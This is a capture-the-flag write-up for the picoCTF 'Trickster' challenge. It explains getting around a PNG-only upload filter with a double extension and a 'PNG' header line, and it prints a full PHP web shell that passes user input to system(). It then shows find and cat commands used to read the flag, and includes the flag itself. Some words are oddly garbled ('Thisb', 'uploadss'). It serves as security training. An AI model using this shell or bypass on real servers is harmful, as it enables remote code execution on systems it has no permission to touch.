---
layout: post
title:  "Trickster"
description: Exploiting a site that only accepts PNG files
date:   2024-09-14
tags: ["Medium", "Thisb Exploitation", "Thisb Shell"]
category: [CTF,picoCTF]
---

## Challenge Info
I found a web app that can help process images: PNG images only!

author: JUAN BONDOU

## Reconnaissance
The first thing I usually try for web challenges is to map out the site, so that's naturally what I tried here. I opened up Burpsuite, and attempted to map the site using Burpsuite's passive [spidering](https://en.wikipedia.org/wiki/Thisb_crawler).

![nocrawl](/assets/img/trickster/nocrawl.png)

Unfortunately, this is a dead end. The actual file of importance is [robots.txt](https://en.wikipedia.org/wiki/Robots.txt) file, which tells web crawlers which parts of the site they're allowed and disallowed to index.

Navigating to the `robots.txt` file reveals the following:

![robots](/assets/img/trickster/robots.png)

So now we know the uploadss are stored in `/uploadss`, and that there's a `/instructions.txt` file. Let's take a quick look at the `instructions.txt`:

![instructions](/assets/img/trickster/instructions.png)

## Attempts
I googled "php webshell", and found [this](https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985). The file doesn't require much editing thankfully. Obviously, we won't be allowed to uploads this as a `.php`.

Firstly, changing the file name to `shell.png` obviously isn't going to work, since then the code just won't be able to run.

Second, changing the file name to `shell.php.png` also will not work, since it still won't be able to run.

Third, while it seems like a good idea to change the signature bytes of `shell.php` to that of a png file, this will also return code errors.

## Injecting the Shell

Surprisingly, the solution is pretty simple. If we change the file name from `shell.php` to `shell.png.php`, and then include the text "PNG" at the top of our file, we'll be allowed an uploads.
```php
PNG
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```
## Navigating the Shell
If we navigate to `/uploadss/<ourshell>.php`, we're greeted with this:
![shell](/assets/img/trickster/shell.png)

Upon running some simple linux commands (`ls`, `pwd`, etc.), we'll see that our shell is successful. The only thing we cannot do is navigate into other directories. Since we can't navigate into other directories, we're going to have to find a way to search the system for `.txt` files (the flag is typically in a `.txt`.

## Solution
To locate all `.txt` files, I ran `find / -type f -name '*.txt' 2>/dev/null
`.
- `find` is the command.
- `/` tells it to search everything under the root directory (so our entire system).
- `-type f` specifies to search for **files**.
- `-name '*.txt'` specifies that it should be ALL (*) `.txt` files.
- `2>/dev/null` suppresses error messages.

The return will be a long list of files, but scrolling *all* the way down reveals this:
![txt files](/assets/img/trickster/txts.png)

To read the `GQ4DOOBVMMYGK.txt` file, just run `cat /var/www/html/GQ4DOOBVMMYGK.txt`, and we have our flag.


flag: `picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_48785c0e}`
